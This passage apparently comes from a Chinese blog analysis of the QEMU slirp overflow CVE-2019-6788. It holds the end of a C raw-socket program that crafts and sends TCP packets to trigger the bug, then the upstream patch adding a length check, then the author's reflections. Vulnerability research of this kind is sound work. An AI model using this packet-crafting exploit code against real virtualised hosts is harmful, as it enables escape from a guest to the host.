tcphdr.th_x2 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Data offset (4 bits): size of TCP header in 32-bit words</span></span><br><span class="line">    tcphdr.th_off = TCP_HDRLEN / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flags (8 bits)</span></span><br><span class="line">    <span class="comment">// FIN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// SYN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// RST flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// PSH flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// ACK flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// URG flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ECE flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// CWR flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    tcphdr.th_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        tcphdr.th_flags += (tcp_flags[i] &lt;&lt; i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Window size (16 bits)</span></span><br><span class="line">    tcphdr.th_win = htons(<span class="number">65535</span>);</span><br><span class="line">    <span class="comment">// Urgent pointer (16 bits): 0 (only valid if URG flag is set)</span></span><br><span class="line">    tcphdr.th_urp = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// TCP checksum (16 bits)</span></span><br><span class="line">    tcphdr.th_sum =</span><br><span class="line">        tcp4_checksum(iphdr, tcphdr, (<span class="keyword">uint8_t</span> *)payload, payloadlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Next part of packet is upper layer protocol header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), &amp;tcphdr, TCP_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN + TCP_HDRLEN), payload,</span><br><span class="line">           payloadlen * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to set IP_HDRINCL "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to bind to interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (struct sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"sendto() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">    <span class="built_in">free</span>(payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Computing the internet checksum (RFC 1071).</span></span><br><span class="line"><span class="comment">// Note that the internet checksum does not preclude collisions.</span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">checksum</span><span class="params">(<span class="keyword">uint16_t</span> *addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = len;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> answer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sum up 2-byte values until none or only one byte left.</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *(addr++);</span><br><span class="line">        count -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add left-over byte, if any.</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += *(<span class="keyword">uint8_t</span> *)addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fold 32-bit sum into 16 bits; we lose information by doing this,</span></span><br><span class="line">    <span class="comment">// increasing the chances of a collision.</span></span><br><span class="line">    <span class="comment">// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)</span></span><br><span class="line">    <span class="keyword">while</span> (sum &gt;&gt; <span class="number">16</span>) &#123;</span><br><span class="line">        sum = (sum &amp; <span class="number">0xffff</span>) + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checksum is one's compliment of sum.</span></span><br><span class="line">    answer = ~sum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 ICMP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">icmp4_checksum</span><span class="params">(struct icmp icmphdr, <span class="keyword">uint8_t</span> *payload, <span class="keyword">int</span> payloadlen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> chksumlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>]; <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Type to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_type, <span class="keyword">sizeof</span>(icmphdr.icmp_type));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Code to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_code, <span class="keyword">sizeof</span>(icmphdr.icmp_code));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ICMP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don't know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Identifier to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_id, <span class="keyword">sizeof</span>(icmphdr.icmp_id));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Sequence Number to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_seq, <span class="keyword">sizeof</span>(icmphdr.icmp_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="keyword">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 TCP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">tcp4_checksum</span><span class="params">(struct ip iphdr, struct tcphdr tcphdr, <span class="keyword">uint8_t</span> *payload,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">int</span> payloadlen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> svalue;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_MAXPACKET], cvalue;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> i, chksumlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy source IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_src.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy destination IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_dst.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy zero field to buf (8 bits)</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy transport layer protocol to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_p, <span class="keyword">sizeof</span>(iphdr.ip_p));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP length to buf (16 bits)</span></span><br><span class="line">    svalue = htons(<span class="keyword">sizeof</span>(tcphdr) + payloadlen);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;svalue, <span class="keyword">sizeof</span>(svalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP source port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_sport, <span class="keyword">sizeof</span>(tcphdr.th_sport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP destination port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_dport, <span class="keyword">sizeof</span>(tcphdr.th_dport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy sequence number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_seq, <span class="keyword">sizeof</span>(tcphdr.th_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy acknowledgement number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_ack, <span class="keyword">sizeof</span>(tcphdr.th_ack));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy data offset to buf (4 bits) and</span></span><br><span class="line">    <span class="comment">// copy reserved bits to buf (4 bits)</span></span><br><span class="line">    cvalue = (tcphdr.th_off &lt;&lt; <span class="number">4</span>) + tcphdr.th_x2;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;cvalue, <span class="keyword">sizeof</span>(cvalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP flags to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_flags, <span class="keyword">sizeof</span>(tcphdr.th_flags));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP window size to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_win, <span class="keyword">sizeof</span>(tcphdr.th_win));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don't know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy urgent pointer to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_urp, <span class="keyword">sizeof</span>(tcphdr.th_urp));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="keyword">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of chars.</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">allocate_strmem</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_strmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_strmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of unsigned chars.</span></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> *<span class="title">allocate_ustrmem</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_ustrmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_ustrmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of ints.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">allocate_intmem</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_intmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_intmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *desc, <span class="keyword">void</span> *addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buff[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *pc = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output description if given.</span></span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s:\n"</span>, desc);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  ZERO LENGTH\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  NEGATIVE LENGTH: %i\n"</span>, len);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process every byte in the data.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// Multiple of 16 means new line (with line offset).</span></span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Just don't print ASCII for the zeroth line.</span></span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">            <span class="comment">// Output the offset.</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"  %04x "</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Now the hex code for the specific character.</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" %02x"</span>, pc[i]);</span><br><span class="line">        <span class="comment">// And store a printable ASCII character for later.</span></span><br><span class="line">        <span class="keyword">if</span> ((pc[i] &lt; <span class="number">0x20</span>) || (pc[i] &gt; <span class="number">0x7e</span>))</span><br><span class="line">            buff[i % <span class="number">16</span>] = <span class="string">'.'</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            buff[i % <span class="number">16</span>] = pc[i];</span><br><span class="line">        buff[(i % <span class="number">16</span>) + <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Pad out last line if not exactly 16 characters.</span></span><br><span class="line">    <span class="keyword">while</span> ((i % <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// And print the final ASCII bit.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞patch"><a href="#漏洞patch" class="headerlink" title="漏洞patch"></a>漏洞patch</h2><p>在memcpy前增加了长度检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">			<span class="keyword">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> = &amp;<span class="title">so</span>-&gt;<span class="title">so_rcv</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen   <span class="comment">//增加了检查</span></span><br><span class="line">					- (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) &#123;</span><br><span class="line">			    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">			so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">			so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br></pre></td></tr></table></figure>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>搜这个CVE的时候看到了一个师傅的分析，其中引用的一个大佬的话发人深省。</p>
<p>最近在想分析漏洞究竟要到什么地步才算分析透彻，个人觉得能理解一个漏洞产生的原因，利用链以及挖掘相同漏洞的经验就算分析的比较透彻了，这也是我需要向raycp和其他师傅学习的东西。</p>
<p><img src="/2021/01/02/cve-2019-6788/15.png" alt></p>
<p>最后的最后来点碎碎念，昨晚做梦跟一个尊敬的前辈聊天，问他我怎样才能进入xx实验室，前辈说我不够努力，是进不去的，醒来非常难受，希望寒假可以真真切切地做点事情。</p>
